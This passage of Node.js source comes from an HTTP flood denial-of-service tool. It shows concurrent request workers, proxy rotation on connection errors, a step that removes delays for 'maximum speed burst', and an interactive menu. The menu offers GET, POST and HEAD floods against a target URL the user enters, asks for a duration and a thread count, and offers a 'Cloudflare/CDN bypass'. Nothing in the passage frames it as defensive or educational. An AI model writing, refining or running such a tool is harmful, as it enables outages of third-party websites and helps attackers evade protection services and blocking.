                    console.log(`[DEBUG] T${threadId}: ERROR - ${errorCode} - ${error.message?.substring(0, 50)} - Proxy: ${useProxy ? config.proxies[proxyIndex].substring(0, 20) : 'NO'}`);
                }
                
                // Handle connection reset errors
                if (useProxy && (errorCode === 'ECONNRESET' || errorCode === 'ECONNREFUSED' || errorCode === 'EPIPE')) {
                    // Clear cached agent on connection errors
                    cachedAgent = null;
                    
                    if (failCount >= 3) {
                        proxyIndex = (proxyIndex + 1) % config.proxies.length;
                        failCount = 0;
                        if (config.debug) {
                            console.log(`[DEBUG] T${threadId}: Rotating to next proxy after connection errors`);
                        }
                    }
                    // Add delay on connection errors
                    await new Promise(resolve => setTimeout(resolve, 200));
                } else if (useProxy && failCount >= 3) {
                    cachedAgent = null;
                    proxyIndex = (proxyIndex + 1) % config.proxies.length;
                    failCount = 0;
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
            }
        };
        
        // Run requests in batches of 2 concurrent
        while (this.running && Date.now() < endTime) {
            const batch = [];
            for (let i = 0; i < concurrency; i++) {
                if (this.running && Date.now() < endTime) {
                    batch.push(makeRequest());
                }
            }
            
            await Promise.all(batch);
            
            // No delay for maximum speed burst (removed 15ms delay)
            // await new Promise(resolve => setTimeout(resolve, 15));
            
            // Check RPS limit if enabled
            if (config.maxRPS && useProxy) {
                const elapsed = (Date.now() - config.stats.startTime) / 1000;
                const currentRate = config.stats.totalRequests / elapsed;
                if (currentRate > config.maxRPS) {
                    await new Promise(resolve => setTimeout(resolve, 30));
                }
            }
        }
    }
    
    async start() {
        await this.prepare();
        
        console.log(`[*] Starting attack with ${this.threads} async workers...`);
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker(i));
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => {
            this.running = false;
        }, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        
        displayStats();
        console.log('\n[+] Attack completed!');
    }
}

async function main() {
    console.log(BANNER);
    
    const debugInput = await question('[?] Enable debug mode? (y/n): ');
    config.debug = debugInput.toLowerCase() === 'y';
    
    let targetUrl = null;
    let validateProxies = false;
    
    const proxyInput = await question('[?] Use proxies? (y/n): ');
    if (proxyInput.toLowerCase() === 'y') {
        const validateInput = await question('[?] Validate proxies against target? (recommended) (y/n): ');
        validateProxies = validateInput.toLowerCase() === 'y';
        
        if (validateProxies) {
            targetUrl = await question('[>] Enter target URL for validation (e.g., https://example.com): ');
            if (!targetUrl.startsWith('http')) {
                targetUrl = 'https://' + targetUrl;
            }
            console.log(`[*] Will validate proxies against: ${targetUrl}\n`);
        }
        
        const loaded = await loadProxies('proxies.txt', targetUrl, validateProxies);
        if (!loaded) {
            const continueInput = await question('[?] Continue without proxies? (y/n): ');
            if (continueInput.toLowerCase() !== 'y') {
                console.log('[!] Exiting...');
                rl.close();
                process.exit(0);
            }
        } else {
            const rpsInput = await question('[?] Set max RPS limit? (leave empty for unlimited): ');
            if (rpsInput && !isNaN(rpsInput)) {
                config.maxRPS = parseInt(rpsInput);
                console.log(`[*] RPS limited to: ${config.maxRPS.toLocaleString()} req/s\n`);
            }
        }
    }
    
    console.log('\n[SELECT ATTACK TYPE]');
    console.log('  1. HTTP GET Flood (Ultra-Fast)');
    console.log('  2. HTTP POST Flood (Ultra-Fast)');
    console.log('  3. HTTP HEAD Flood');
    
    const choice = await question('\n[>] Select attack (1-3): ');
    
    if (['1', '2', '3'].includes(choice)) {
        let finalUrl = targetUrl;
        
        if (!finalUrl) {
            const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
            finalUrl = url.trim();
        }
        
        if (!finalUrl.startsWith('http')) {
            finalUrl = 'https://' + finalUrl;
            console.log(`[*] Added HTTPS protocol: ${finalUrl}`);
        }
        
        const duration = parseInt(await question('[>] Duration (seconds): '));
        const threads = parseInt(await question('[>] Number of threads (10-500): '));
        
        const bypassCF = await question('[?] Attempt Cloudflare/CDN bypass? (y/n): ');
        const useOrigin = bypassCF.toLowerCase() === 'y';
        
        const method = choice === '1' ? 'GET' : choice === '2' ? 'POST' : 'HEAD';
        
        const attack = new HTTPFlood(finalUrl, duration, threads, method, useOrigin);
        await attack.start();
    } else {
        console.log('[!] Invalid choice!');
    }
    
    rl.close();
    process.exit(0);
}

if (require.main === module) {
    main().catch(err => {
        console.error('\n[!] Error:', err.message);
        rl.close();
        process.exit(1);
    });
}
